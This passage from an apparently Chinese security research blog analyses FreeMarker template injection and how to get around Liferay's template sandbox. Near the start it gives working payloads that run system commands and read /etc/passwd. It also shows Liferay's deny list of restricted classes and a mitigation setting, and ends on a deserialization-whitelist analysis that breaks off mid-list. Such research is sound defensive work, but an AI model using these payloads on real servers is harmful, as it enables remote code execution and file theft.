class="string">&quot;ifconfig&quot;</span>).start().getInputStream())) &gt;</span><br><span class="line">    &lt;#list <span class="number">1.</span><span class="number">.10000</span> as t&gt;</span><br><span class="line">        &lt;#assign line=br.readLine()!<span class="string">&quot;null&quot;</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> line==<span class="string">&quot;null&quot;</span>&gt;</span><br><span class="line">            &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">        &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">        $&#123;line&#125;</span><br><span class="line">        $&#123;<span class="string">&quot;&lt;br&gt;&quot;</span>&#125;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line"></span><br><span class="line">&lt;#--    读文件 --&gt;</span><br><span class="line">    &lt;#assign ob=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;</span><br><span class="line">    &lt;#assign br=ob(<span class="string">&quot;java.io.BufferedReader&quot;</span>,ob(<span class="string">&quot;java.io.InputStreamReader&quot;</span>,ob(<span class="string">&quot;java.io.FileInputStream&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>))) &gt;</span><br><span class="line">    &lt;#list <span class="number">1.</span><span class="number">.10000</span> as t&gt;</span><br><span class="line">        &lt;#assign line=br.readLine()!<span class="string">&quot;null&quot;</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> line==<span class="string">&quot;null&quot;</span>&gt;</span><br><span class="line">            &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">        &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">        $&#123;line?html&#125;</span><br><span class="line">        $&#123;<span class="string">&quot;&lt;br&gt;&quot;</span>&#125;</span><br><span class="line">    &lt;/#list&gt;</span><br></pre></td></tr></table></figure><p>常用的一些内置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#<span class="type">assign</span> <span class="variable">optTemp</span> <span class="operator">=</span> .get_optional_template(<span class="string">&#x27;/etc/passwd&#x27;</span>)&gt;&lt;#<span class="keyword">if</span> optTemp.exists&gt;Template was found:&lt;<span class="meta">@optTemp</span>.include /&gt;&lt;#<span class="keyword">else</span>&gt;Template was missing.&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure><p>include</p><h2 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h2><p>FreeMarker内置了一份危险方法名单<code>unsafeMethods.properties</code>。可以禁用一些方法(api).</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); ban掉new</span><br></pre></td></tr></table></figure><h2 id="0x05-lifeary-摸索"><a href="#0x05-lifeary-摸索" class="headerlink" title="0x05  lifeary 摸索"></a>0x05  lifeary 摸索</h2><p>首先是我们把之前的利用，直接一把嗦进去了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;id&quot;</span>)&#125;<span class="comment">//系统执行id命令并返回</span></span><br></pre></td></tr></table></figure><p>可以看到并没有什么鸟用。</p><p><img src="https://c.img.dasctf.com/images/2022520/1653008064823-db2fdccb-88c7-44b8-ba1f-0e7c4aee3e63.png" alt="image-20220520085415336"></p><p>我们迅速定位到lifeary的<code>LiferayTemplateClassResolver</code>,这个类是处理类的新建的，可以有效的来看看这个错误到底是什么？</p><p><img src="https://img.dem0dem0.top/images/image-20220520090123858.png" alt="image-20220520090123858"></p><p>这两个类是直接ban了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">restrictedClassNames = &#123;String[13]@44707&#125; [&quot;com.liferay.por...&quot;, &quot;java.lang.Class&quot;, &quot;java.lang.Class...&quot;, &quot;java.lang.Compi...&quot;, &quot;java.lang.Packa...&quot;, +8 more]</span><br><span class="line"> 0 = &quot;com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist&quot;</span><br><span class="line"> 1 = &quot;java.lang.Class&quot;</span><br><span class="line"> 2 = &quot;java.lang.ClassLoader&quot;</span><br><span class="line"> 3 = &quot;java.lang.Compiler&quot;</span><br><span class="line"> 4 = &quot;java.lang.Package&quot;</span><br><span class="line"> 5 = &quot;java.lang.Process&quot;</span><br><span class="line"> 6 = &quot;java.lang.Runtime&quot;</span><br><span class="line"> 7 = &quot;java.lang.RuntimePermission&quot;</span><br><span class="line"> 8 = &quot;java.lang.SecurityManager&quot;</span><br><span class="line"> 9 = &quot;java.lang.System&quot;</span><br><span class="line"> 10 = &quot;java.lang.Thread&quot;</span><br><span class="line"> 11 = &quot;java.lang.ThreadGroup&quot;</span><br><span class="line"> 12 = &quot;java.lang.ThreadLocal&quot;</span><br></pre></td></tr></table></figure><p>不能新建这些类了，然后我们继续看，又发现了一个白名单，有狗？默认为空，也不能用了。所以<code>new</code>是没得用了。但是有一个新鲜的类。如果有白名单就可以利用了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;com.liferay.portal.template.freemarker.internal.LiferayObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure><p>但是这个很明显是没有什么用的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Meta</span>.AD(name = <span class="string">&quot;allowed-classes&quot;</span>, required = <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">public</span> String[] allowedClasses();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Meta</span>.AD(</span><br><span class="line">deflt = <span class="string">&quot;com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal&quot;</span>,</span><br><span class="line">name = <span class="string">&quot;restricted-classes&quot;</span>, required = <span class="literal">false</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> String[] restrictedClasses();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Meta</span>.AD(name = <span class="string">&quot;allowed-classes&quot;</span>, required = <span class="literal">false</span>)</span><br><span class="line"> <span class="keyword">public</span> String[] allowedClasses();</span><br><span class="line"></span><br><span class="line"> <span class="meta">@Meta</span>.AD(</span><br><span class="line">     deflt = <span class="string">&quot;com.ibm.*|com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|com.liferay.portal.spring.context.*|io.undertow.*|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal|org.apache.*|org.glassfish.*|org.jboss.*|org.springframework.*|org.wildfly.*|weblogic.*&quot;</span>,</span><br><span class="line">     name = <span class="string">&quot;restricted-classes&quot;</span>, required = <span class="literal">false</span></span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">public</span> String[] restrictedClasses();</span><br></pre></td></tr></table></figure><p>对比出来的差距有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.ibm.*</span><br><span class="line">com.liferay.portal.spring.context.*</span><br><span class="line">io.undertow.*</span><br><span class="line">org.apache.*</span><br><span class="line">org.glassfish.*</span><br><span class="line">org.jboss.*</span><br><span class="line">org.springframework.*</span><br><span class="line">org.wildfly.*</span><br><span class="line">weblogic.*</span><br></pre></td></tr></table></figure><p>这些类在最后都会成为我们bypass沙箱的主要支柱。还有一个小的bypass技巧。</p><p><img src="https://img.dem0dem0.top/images/image-20220520101903529.png" alt="image-20220520101903529"></p><h3 id="内部的对象"><a href="#内部的对象" class="headerlink" title="内部的对象"></a>内部的对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">result = &#123;HashMap@<span class="number">48419</span>&#125;  size = <span class="number">147</span></span><br><span class="line"> <span class="string">&quot;reserved-article-author-job-title&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48531</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;portal&quot;</span> -&gt; &#123;PortalImpl@<span class="number">48241</span>&#125; </span><br><span class="line"> <span class="string">&quot;commonPermission&quot;</span> -&gt; &#123;CommonPermissionImpl@<span class="number">48268</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletDisplay&quot;</span> -&gt; &#123;PortletDisplay@<span class="number">48270</span>&#125; </span><br><span class="line"> <span class="string">&quot;expandoValueLocalService&quot;</span> -&gt; &#123;$Proxy44@<span class="number">48272</span>&#125; </span><br><span class="line"> <span class="string">&quot;init&quot;</span> -&gt; <span class="string">&quot;/classic-theme_SERVLET_CONTEXT_/templates/init.ftl&quot;</span></span><br><span class="line"> <span class="string">&quot;plid&quot;</span> -&gt; <span class="string">&quot;2&quot;</span></span><br><span class="line"> <span class="string">&quot;organizationPermission&quot;</span> -&gt; &#123;OrganizationPermissionImpl@<span class="number">48278</span>&#125; </span><br><span class="line"> <span class="string">&quot;passwordPolicyPermission&quot;</span> -&gt; &#123;PasswordPolicyPermissionImpl@<span class="number">48280</span>&#125; </span><br><span class="line"> <span class="string">&quot;expandoColumnLocalService&quot;</span> -&gt; &#123;$Proxy41@<span class="number">48282</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-asset-tag-names&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48539</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;renderRequest&quot;</span> -&gt; &#123;RenderRequestImpl@<span class="number">48541</span>&#125; </span><br><span class="line"> <span class="string">&quot;timeZone&quot;</span> -&gt; &#123;ZoneInfo@<span class="number">48286</span>&#125; <span class="string">&quot;sun.util.calendar.ZoneInfo[id=&quot;</span>UTC<span class="string">&quot;,offset=0,dstSavings=0,useDaylight=false,transitions=0,lastRule=null]&quot;</span></span><br><span class="line"> <span class="string">&quot;languageUtil&quot;</span> -&gt; &#123;LanguageImpl@<span class="number">48290</span>&#125; </span><br><span class="line"> <span class="string">&quot;randomNamespace&quot;</span> -&gt; <span class="string">&quot;rclo_&quot;</span></span><br><span class="line"> <span class="string">&quot;enumUtil&quot;</span> -&gt; &#123;_EnumModels@<span class="number">48544</span>&#125; </span><br><span class="line"> <span class="string">&quot;realUser&quot;</span> -&gt; &#123;UserImpl@<span class="number">48300</span>&#125;</span><br><span class="line"> <span class="string">&quot;liferay_aui&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48546</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay-fragment&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48548</span>&#125; </span><br><span class="line"> <span class="string">&quot;unicodeFormatter&quot;</span> -&gt; &#123;UnicodeFormatter_IW@<span class="number">48302</span>&#125; </span><br><span class="line"> <span class="string">&quot;propsUtil&quot;</span> -&gt; &#123;PropsImpl@<span class="number">48304</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_social_activities&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48550</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletURLFactory&quot;</span> -&gt; &#123;PortletURLFactoryImpl@<span class="number">48312</span>&#125; </span><br><span class="line"> <span class="string">&quot;imageToken&quot;</span> -&gt; &#123;WebServerServletTokenImpl@<span class="number">48314</span>&#125; </span><br><span class="line"> <span class="string">&quot;device&quot;</span> -&gt; &#123;UnknownDevice@<span class="number">48554</span>&#125; </span><br><span class="line"> <span class="string">&quot;Application&quot;</span> -&gt; &#123;ServletContextHashModel@<span class="number">48556</span>&#125; </span><br><span class="line"> <span class="string">&quot;timeZoneUtil&quot;</span> -&gt; &#123;TimeZoneUtil_IW@<span class="number">48320</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-id&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48558</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;auditRouterUtil&quot;</span> -&gt; &#123;$Proxy252@<span class="number">48328</span>&#125; </span><br><span class="line"> <span class="string">&quot;accountPermission&quot;</span> -&gt; &#123;AccountPermissionImpl@<span class="number">48330</span>&#125; </span><br><span class="line"> <span class="string">&quot;layoutTypePortlet&quot;</span> -&gt; &#123;LayoutTypePortletImpl@<span class="number">48332</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-url-title&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48560</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;reserved-article-small-image-url&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48562</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;clay&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48564</span>&#125; </span><br><span class="line"> <span class="string">&quot;rolePermission&quot;</span> -&gt; &#123;RolePermissionImpl@<span class="number">48343</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_product_navigation&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48566</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_site&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48568</span>&#125; </span><br><span class="line"> <span class="string">&quot;paramUtil&quot;</span> -&gt; &#123;ParamUtil_IW@<span class="number">48347</span>&#125; </span><br><span class="line"> <span class="string">&quot;bodyCssClass&quot;</span> -&gt; <span class="string">&quot;dialog-iframe-popup dialog-with-footer&quot;</span></span><br><span class="line"> <span class="string">&quot;locationPermission&quot;</span> -&gt; &#123;OrganizationPermissionImpl@<span class="number">48278</span>&#125; </span><br><span class="line"> <span class="string">&quot;theme&quot;</span> -&gt; &#123;ThemeImpl@<span class="number">48354</span>&#125; </span><br><span class="line"> <span class="string">&quot;journalContent&quot;</span> -&gt; &#123;JournalContentImpl@<span class="number">48570</span>&#125; </span><br><span class="line"> <span class="string">&quot;portlet&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48572</span>&#125; </span><br><span class="line"> <span class="string">&quot;calendarFactory&quot;</span> -&gt; &#123;CalendarFactoryImpl@<span class="number">48356</span>&#125; </span><br><span class="line"> <span class="string">&quot;userGroupPermission&quot;</span> -&gt; &#123;UserGroupPermissionImpl@<span class="number">48363</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_journal&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48576</span>&#125; </span><br><span class="line"> <span class="string">&quot;prefsPropsUtil&quot;</span> -&gt; &#123;PrefsPropsImpl@<span class="number">48367</span>&#125; </span><br><span class="line"> <span class="string">&quot;xmlRequest&quot;</span> -&gt; &#123;TemplateContextHelper$<span class="number">1</span>@<span class="number">48578</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_portlet&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48580</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_flags&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48582</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_theme&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48584</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_ui&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48586</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_layout&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48552</span>&#125; </span><br><span class="line"> <span class="string">&quot;urlCodec&quot;</span> -&gt; &#123;URLCodec_IW@<span class="number">48377</span>&#125; </span><br><span class="line"> <span class="string">&quot;requestMap&quot;</span> -&gt; &#123;HashMap@<span class="number">48588</span>&#125;  size = <span class="number">28</span></span><br><span class="line"> <span class="string">&quot;portletModeFactory&quot;</span> -&gt; &#123;PortletModeFactory_IW@<span class="number">48379</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletRequestModelFactory&quot;</span> -&gt; &#123;PortletRequestModelFactory@<span class="number">48590</span>&#125; </span><br><span class="line"> <span class="string">&quot;chart&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48592</span>&#125; </span><br><span class="line"> <span class="string">&quot;colorScheme&quot;</span> -&gt; &#123;ColorSchemeImpl@<span class="number">48388</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_site_navigation&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48594</span>&#125; </span><br><span class="line"> <span class="string">&quot;themeDisplay&quot;</span> -&gt; &#123;ThemeDisplay@<span class="number">48229</span>&#125; </span><br><span class="line"> <span class="string">&quot;portalPermission&quot;</span> -&gt; &#123;PortalPermissionImpl@<span class="number">48233</span>&#125; </span><br><span class="line"> <span class="string">&quot;layoutPermission&quot;</span> -&gt; &#123;LayoutPermissionImpl@<span class="number">48235</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_util&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48596</span>&#125; </span><br><span class="line"> <span class="string">&quot;expandoTableLocalService&quot;</span> -&gt; &#123;$Proxy43@<span class="number">48237</span>&#125; </span><br><span class="line"> <span class="string">&quot;journalTemplatesPath&quot;</span> -&gt;</span><br><span class="line"> <span class="string">&quot;localeUtil&quot;</span> -&gt; &#123;LocaleUtil@<span class="number">48239</span>&#125; </span><br><span class="line"> <span class="string">&quot;groupId&quot;</span> -&gt; &#123;Long@<span class="number">48600</span>&#125; <span class="number">20119</span></span><br><span class="line"> <span class="string">&quot;portalUtil&quot;</span> -&gt; &#123;PortalImpl@<span class="number">48241</span>&#125; </span><br><span class="line"> <span class="string">&quot;validator&quot;</span> -&gt; &#123;Validator_IW@<span class="number">48243</span>&#125; </span><br><span class="line"> <span class="string">&quot;jsonFactoryUtil&quot;</span> -&gt; &#123;JSONFactoryImpl@<span class="number">48251</span>&#125; </span><br><span class="line"> <span class="string">&quot;stringUtil&quot;</span> -&gt; &#123;StringUtil_IW@<span class="number">48253</span>&#125; </span><br><span class="line"> <span class="string">&quot;htmlTitle&quot;</span> -&gt; <span class="string">&quot;Home - Liferay&quot;</span></span><br><span class="line"> <span class="string">&quot;scopeGroupId&quot;</span> -&gt; &#123;Long@<span class="number">48602</span>&#125; <span class="number">20119</span></span><br><span class="line"> <span class="string">&quot;dateFormatFactory&quot;</span> -&gt; &#123;FastDateFormatFactoryImpl@<span class="number">48260</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-author-email-address&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48604</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;reserved-article-author-comments&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48606</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;liferay_sharing&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48608</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_asset&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48610</span>&#125; </span><br><span class="line"> <span class="string">&quot;PortletJspTagLibs&quot;</span> -&gt; &#123;FreeMarkerManager$TaglibFactoryWrapper@<span class="number">48612</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-description&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48614</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;reserved-article-title&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48616</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;articleGroupId&quot;</span> -&gt; &#123;Long@<span class="number">48618</span>&#125; <span class="number">20119</span></span><br><span class="line"> <span class="string">&quot;htmlUtil&quot;</span> -&gt; &#123;HtmlImpl@<span class="number">48288</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_reading_time&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48620</span>&#125; </span><br><span class="line"> <span class="string">&quot;permissionChecker&quot;</span> -&gt; &#123;StagingPermissionChecker@<span class="number">48292</span>&#125; </span><br><span class="line"> <span class="string">&quot;viewMode&quot;</span> -&gt; <span class="string">&quot;view&quot;</span></span><br><span class="line"> <span class="string">&quot;PortalJspTagLibs&quot;</span> -&gt; &#123;FreeMarkerManager$TaglibFactoryWrapper@<span class="number">48612</span>&#125; </span><br><span class="line"> <span class="string">&quot;templatesPath&quot;</span> -&gt; <span class="string">&quot;_TEMPLATE_CONTEXT_/20095/20119/34526&quot;</span></span><br><span class="line"> <span class="string">&quot;windowStateFactory&quot;</span> -&gt; &#123;WindowStateFactory_IW@<span class="number">48298</span>&#125; </span><br><span class="line"> <span class="string">&quot;companyId&quot;</span> -&gt; &#123;Long@<span class="number">48625</span>&#125; <span class="number">20095</span></span><br><span class="line"> <span class="string">&quot;reserved-article-version&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48627</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;browserSniffer&quot;</span> -&gt; &#123;BrowserSnifferImpl@<span class="number">48306</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_security&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48687</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletProviderAction&quot;</span> -&gt; &#123;HashMap@<span class="number">48688</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;httpUtil&quot;</span> -&gt; &#123;TemplateContextHelper$HttpWrapper@<span class="number">48689</span>&#125; </span><br><span class="line"> <span class="string">&quot;reserved-article-author-name&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48691</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;groupPermission&quot;</span> -&gt; &#123;GroupPermissionImpl@<span class="number">48316</span>&#125; </span><br><span class="line"> <span class="string">&quot;fullCssPath&quot;</span> -&gt; <span class="string">&quot;/classic-theme_SERVLET_CONTEXT_/css&quot;</span></span><br><span class="line"> <span class="string">&quot;reserved-article-author-id&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48694</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;unicodeLanguageUtil&quot;</span> -&gt; &#123;UnicodeLanguageImpl@<span class="number">48322</span>&#125; </span><br><span class="line"> <span class="string">&quot;request&quot;</span> -&gt; &#123;ProtectedServletRequest@<span class="number">48324</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_comment&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48696</span>&#125; </span><br><span class="line"> <span class="string">&quot;expandoRowLocalService&quot;</span> -&gt; &#123;$Proxy42@<span class="number">48326</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_editor&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48698</span>&#125; </span><br><span class="line"> <span class="string">&quot;fullTemplatesPath&quot;</span> -&gt; <span class="string">&quot;/classic-theme_SERVLET_CONTEXT_/templates&quot;</span></span><br><span class="line"> <span class="string">&quot;navItems&quot;</span> -&gt; &#123;ArrayList@<span class="number">48700</span>&#125;  size = <span class="number">1</span></span><br><span class="line"> <span class="string">&quot;locale&quot;</span> -&gt; &#123;Locale@<span class="number">44689</span>&#125; <span class="string">&quot;zh_CN&quot;</span></span><br><span class="line"> <span class="string">&quot;reserved-article-display-date&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48702</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;content&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48704</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;random&quot;</span> -&gt; &#123;Random@<span class="number">48705</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletPermission&quot;</span> -&gt; &#123;PortletPermissionImpl@<span class="number">48345</span>&#125; </span><br><span class="line"> <span class="string">&quot;renderResponse&quot;</span> -&gt; &#123;RenderResponseImpl@<span class="number">48707</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_map&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48709</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_item_selector&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48711</span>&#125; </span><br><span class="line"> <span class="string">&quot;siteGroupId&quot;</span> -&gt; &#123;Long@<span class="number">48713</span>&#125; <span class="number">20119</span></span><br><span class="line"> <span class="string">&quot;liferay_rss&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48715</span>&#125; </span><br><span class="line"> <span class="string">&quot;company&quot;</span> -&gt; &#123;CompanyImpl@<span class="number">48352</span>&#125;</span><br><span class="line"> <span class="string">&quot;reserved-article-create-date&quot;</span> -&gt; &#123;TemplateNode@<span class="number">48717</span>&#125;  size = <span class="number">6</span></span><br><span class="line"> <span class="string">&quot;adaptive_media_image&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48719</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_expando&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48721</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_frontend&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48723</span>&#125; </span><br><span class="line"> <span class="string">&quot;webServerToken&quot;</span> -&gt; &#123;WebServerServletTokenImpl@<span class="number">48314</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_document_library&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48725</span>&#125; </span><br><span class="line"> <span class="string">&quot;sessionClicks&quot;</span> -&gt; &#123;SessionClicks_IW@<span class="number">48359</span>&#125; </span><br><span class="line"> <span class="string">&quot;userPermission&quot;</span> -&gt; &#123;UserPermissionImpl@<span class="number">48361</span>&#125; </span><br><span class="line"> <span class="string">&quot;Request&quot;</span> -&gt; &#123;HttpRequestHashModel@<span class="number">48727</span>&#125; </span><br><span class="line"> <span class="string">&quot;arrayUtil&quot;</span> -&gt; &#123;ArrayUtil_IW@<span class="number">48365</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_trash&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48729</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletGroupId&quot;</span> -&gt; &#123;Long@<span class="number">48730</span>&#125; <span class="number">20119</span></span><br><span class="line"> <span class="string">&quot;journalContentUtil&quot;</span> -&gt; &#123;JournalContentImpl@<span class="number">48570</span>&#125; </span><br><span class="line"> <span class="string">&quot;layout&quot;</span> -&gt; &#123;LayoutImpl@<span class="number">48371</span>&#125; </span><br><span class="line"> <span class="string">&quot;liferay_social_bookmarks&quot;</span> -&gt; &#123;TaglibFactory$Taglib@<span class="number">48733</span>&#125; </span><br><span class="line"> <span class="string">&quot;portletConfig&quot;</span> -&gt; &#123;PortletConfigImpl@<span class="number">48735</span>&#125; </span><br><span class="line"> <span class="string">&quot;imageToolUtil&quot;</span> -&gt; &#123;ImageToolImpl@<span class="number">48381</span>&#125; </span><br><span class="line"> <span class="string">&quot;writer&quot;</span> -&gt; &#123;UnsyncStringWriter@<span class="number">48417</span>&#125; <span class="string">&quot;&quot;</span></span><br><span class="line"> <span class="string">&quot;auditMessageFactoryUtil&quot;</span> -&gt; &#123;AuditMessageFactoryImpl@<span class="number">48383</span>&#125; </span><br><span class="line"> <span class="string">&quot;user&quot;</span> -&gt; &#123;UserImpl@<span class="number">48300</span>&#125; </span><br><span class="line"> <span class="string">&quot;taglibLiferayHash&quot;</span> -&gt; &#123;FreeMarkerManager$TaglibFactoryWrapper@<span class="number">48612</span>&#125; </span><br></pre></td></tr></table></figure><h3 id="jsonFactoryUtil"><a href="#jsonFactoryUtil" class="headerlink" title="jsonFactoryUtil"></a>jsonFactoryUtil</h3><p>可以进行json的反序列化操作的一个datamodel。这个类的两个方法就是<code>serialize</code>和<code>deserialize</code>方法。我们其中重点关注<code>deserialize</code>方法。</p><p><img src="https://c.img.dasctf.com/images/2022526/1653552171711-0604fd3a-72bd-429f-8221-2ad4b253eddd.png" alt="image-20220526160242269"></p><p><code>LiferayJSONSerializer</code>父类的<code>fromJSON</code>方法，发现其中又调用了<code>unmarshall</code>方法。在<code>unmarshall</code>方法中会调用<code>getClassFromHint</code>方法，不过该方法在子类被重写了。我们现在还有可以利用的就是<strong>如果通过白名单校验，就会通过<code>contextName</code>字段的值去指定<code>ClassLoader</code>用于加载<code>javaClass</code>字段指定的类。</strong>最后在方法末尾会执行<code>super.getClassFromHint(object)</code>，回调父类的<code>getClassFromHint</code>的方法。</p><p>这是JSON反序列化的白名单类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">json.deserialization.whitelist.class.names=\</span><br><span class="line">    com.liferay.portal.kernel.cal.DayAndPosition,\</span><br><span class="line">    com.liferay.portal.kernel.cal.Duration,\</span><br><span class="line">    com.liferay.portal.kernel.cal.TZSRecurrence,\</span><br><span class="line">    com.liferay.portal.kernel.messaging.Message,\</span><br><span class="line">    com.liferay.portal.kernel.model.PortletPreferencesIds,\</span><br><span class="line">    com.liferay.portal.kernel.security.auth.HttpPrincipal,\</span><br><span class="line">    com.liferay.portal.kernel.service.permission.ModelPermissions,\</span><br><span class="line">    com.liferay.portal.kernel.service.ServiceContext,\</span><br><span class="line">    com.liferay.portal.kernel.util.GroupSubscriptionCheckSubscriptionSender,\</span><br><span class="line">    